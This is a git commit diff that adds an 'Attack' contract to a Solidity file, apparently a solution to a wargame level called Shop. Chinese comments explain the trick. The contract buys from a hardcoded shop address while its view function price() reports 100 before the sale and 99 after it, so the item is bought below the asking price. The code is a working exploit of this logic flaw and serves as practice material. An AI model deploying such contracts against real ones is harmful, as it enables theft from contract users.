fd23ec617459e035ad2eaecae1bc48cb59023336
zhou <1036767219@qq.com>
2023-02-14 20:43:02 +0800

    upload Attack合约

--- 22_shop.sol
+++ 22_shop.sol
@@ -18,3 +18,21 @@ contract Shop {
     }
   }
 }
+
+//怎样能够使得view方法两次返回的值不同
+//1.依托于外部合约的变化，2.依托于本身变量的变化/如果view类型方法依托于外部合约的状态，通过询问外部变量，即可无修改地实现返回值的区别
+
+contract Attack {
+  
+  Shop shop;
+   function att()public{
+     shop=Shop(0xB5f05481DAdb5044C0cCCEc95dABB07577e3665C);
+     shop.buy();
+   }
+   function price()external view returns (uint){
+     if(shop.isSold()==false){
+       return 100;
+     }
+     return 99;
+   }
+}
